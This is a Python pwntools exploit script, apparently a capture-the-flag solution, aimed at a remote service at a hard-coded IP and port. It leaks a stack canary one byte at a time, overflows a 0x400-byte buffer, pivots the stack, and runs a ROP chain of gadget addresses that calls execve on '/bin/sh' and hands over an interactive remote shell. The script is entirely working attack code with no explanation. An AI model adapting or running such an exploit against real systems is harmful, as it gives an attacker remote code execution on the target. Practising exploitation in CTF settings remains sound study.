#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "69.90.132.40"
port = 4000

context.arch = "amd64"
r = remote(host,port)
canary = "\x00"
for i in range(1,8):
    r.recvuntil("?")
    r.sendline(str(i))
    r.recvuntil("= ")
    value = int(r.recvuntil("\n").strip())
    canary += chr(value)
print "canary:",hex(u64(canary))

syscall = 0x0000000000400f8f
printf = 0x400940
scanf = 0x4009b0
cout = 0x0000000006021e0
srand = 0x4009e0 
s = 0x4010e3
leave = 0x0000000000400d91
pop_rdi = 0x0000000000400f63
pop_rsp_3_ret = 0x0000000000400f5d
pop_rsi_r15 = 0x0000000000400f61 
out = 0x0000000000400d3e
buf = 0x6025a0 
mov_rdx_rsi = 0x0000000000400f88
ret = 0x400f64
payload = "a"*0x400 + p64(buf) + canary + p64(buf) 
payload += flat([pop_rdi,0,pop_rsi_r15,buf,0,mov_rdx_rsi,syscall,pop_rsp_3_ret,buf-0x18])
r.recvuntil("?")
r.sendline("-1")
r.recvuntil("Leave a comment:")
sh = buf+0x30 
r.sendline(payload)
rop = flat([pop_rdi,sh,pop_rsi_r15,0,0,syscall]) + "/bin/sh".ljust(0xa,'\x00')
r.sendline(rop)
r.interactive()
